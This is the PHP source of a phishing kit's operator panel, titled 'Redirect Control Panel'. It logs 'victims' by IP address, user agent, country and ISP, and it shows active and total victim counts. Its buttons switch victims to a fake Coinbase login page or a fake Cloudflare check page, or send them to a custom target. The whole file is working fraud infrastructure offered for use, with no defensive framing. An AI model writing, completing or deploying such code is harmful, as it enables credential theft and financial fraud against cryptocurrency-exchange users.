<?php
session_start();
require_once __DIR__ . '/admin/auth.php';

if (!is_logged_in()) {
    header('Location: /admin/login.php');
    exit;
}

require_once __DIR__ . '/blocker-raw.php';

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    logout();
    header('Location: /admin/login.php');
    exit;
}

// Handle redirect commands
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['redirect_command'])) {
    $command = $_POST['redirect_command'];
    $target = $_POST['redirect_target'] ?? '';
    
    $database = new Database();
    $db = $database->getConnection();
    
    // Simple redirect table
    $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
        id SERIAL PRIMARY KEY,
        command VARCHAR(50) NOT NULL,
        target TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_table);
    
    switch($command) {
        case 'redirect_to_coinbase':
            $query = "INSERT INTO redirect_commands (command, target) VALUES ('redirect', 'coinbaselogin.html')";
            $_SESSION['success_message'] = 'Redirect set to Coinbase Login';
            break;
            
        case 'redirect_to_cloudflare':
            $query = "INSERT INTO redirect_commands (command, target) VALUES ('redirect', 'index.php')";
            $_SESSION['success_message'] = 'Redirect set to Cloudflare Protection';
            break;
            
        case 'redirect_custom':
            if (!empty($target)) {
                $query = "INSERT INTO redirect_commands (command, target) VALUES ('redirect', :target)";
                $stmt = $db->prepare($query);
                $stmt->execute([':target' => $target]);
                $_SESSION['success_message'] = 'Redirect set to: ' . $target;
            } else {
                $_SESSION['error_message'] = 'Please enter a target URL';
            }
            break;
            
        case 'clear_redirect':
            $query = "DELETE FROM redirect_commands WHERE command = 'redirect'";
            $_SESSION['success_message'] = 'Redirect cleared';
            break;
    }
    
    if (isset($query) && $command !== 'redirect_custom') {
        $db->exec($query);
    }
    
    header('Location: /panel.php');
    exit;
}

// Get current redirect and victim stats
$database = new Database();
$db = $database->getConnection();

// Create tables if not exists
$db->exec("CREATE TABLE IF NOT EXISTS redirect_commands (
    id SERIAL PRIMARY KEY,
    command VARCHAR(50) NOT NULL,
    target TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS victims (
    id SERIAL PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    user_agent TEXT,
    country VARCHAR(100),
    isp VARCHAR(200),
    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status VARCHAR(20) DEFAULT 'active',
    page_visited VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

// Get current redirect
$query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
$stmt = $db->query($query);
$current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
$current_redirect = $current_redirect ? $current_redirect['target'] : 'None';

// Get active victims (last 10 minutes)
$active_victims = $db->query("SELECT COUNT(*) as count FROM victims WHERE last_activity > NOW() - INTERVAL '10 minutes'")->fetch()['count'];

// Get total victims
$total_victims = $db->query("SELECT COUNT(*) as count FROM victims")->fetch()['count'];

// Handle messages
if (isset($_SESSION['success_message'])) {
    $success_message = $_SESSION['success_message'];
    unset($_SESSION['success_message']);
}
if (isset($_SESSION['error_message'])) {
    $error_message = $_SESSION['error_message'];
    unset($_SESSION['error_message']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Control Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        body { background: #1a1a1a; color: white; }
        .card { background: #2d2d2d; padding: 20px; margin: 10px 0; }
        .btn { margin: 5px; }
        .stats { font-size: 2em; font-weight: bold; color: #4CAF50; }
    </style>
</head>
<body>
    <nav>
        <div class="nav-wrapper container">
            <a href="#" class="brand-logo">🛡️ Control Panel</a>
            <ul class="right">
                <li><a href="?action=logout">Logout</a></li>
            </ul>
        </div>
    </nav>

    <div class="container">
        <?php if(isset($success_message)): ?>
            <div class="card green"><?php echo $success_message; ?></div>
        <?php endif; ?>
        <?php if(isset($error_message)): ?>
            <div class="card red"><?php echo $error_message; ?></div>
        <?php endif; ?>

        <!-- Stats -->
        <div class="card">
            <h5>📊 Live Stats</h5>
            <div class="row">
                <div class="col s4 center">
                    <div class="stats"><?php echo $active_victims; ?></div>
                    <div>Active Victims</div>
                </div>
                <div class="col s4 center">
                    <div class="stats"><?php echo $total_victims; ?></div>
                    <div>Total Victims</div>
                </div>
                <div class="col s4 center">
                    <div class="stats" style="color: #2196F3;"><?php echo htmlspecialchars($current_redirect); ?></div>
                    <div>Current Redirect</div>
                </div>
            </div>
        </div>

        <!-- Quick Actions -->
        <div class="card">
            <h5>🎯 Quick Redirect Actions</h5>
            <div class="row">
                <div class="col s4">
                    <form method="POST">
                        <input type="hidden" name="redirect_command" value="redirect_to_coinbase">
                        <button class="btn green" type="submit">➡️ Coinbase Login</button>
                    </form>
                </div>
                <div class="col s4">
                    <form method="POST">
                        <input type="hidden" name="redirect_command" value="redirect_to_cloudflare">
                        <button class="btn blue" type="submit">🔄 Cloudflare</button>
                    </form>
                </div>
                <div class="col s4">
                    <form method="POST">
                        <input type="hidden" name="redirect_command" value="clear_redirect">
                        <button class="btn orange" type="submit">❌ Clear Redirect</button>
                    </form>
                </div>
            </div>
        </div>

        <!-- Custom Redirect -->
        <div class="card">
            <h5>🔧 Custom Redirect</h5>
            <form method="POST">
                <div class="row">
                    <div class="input-field col s8">
                        <input type="text" name="redirect_target" placeholder="coinbaselogin.html, index.php, etc.">
                    </div>
                    <div class="col s4">
                        <input type="hidden" name="redirect_command" value="redirect_custom">
                        <button class="btn purple" type="submit" style="width:100%">🎯 Set Custom</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
</body>
</html>
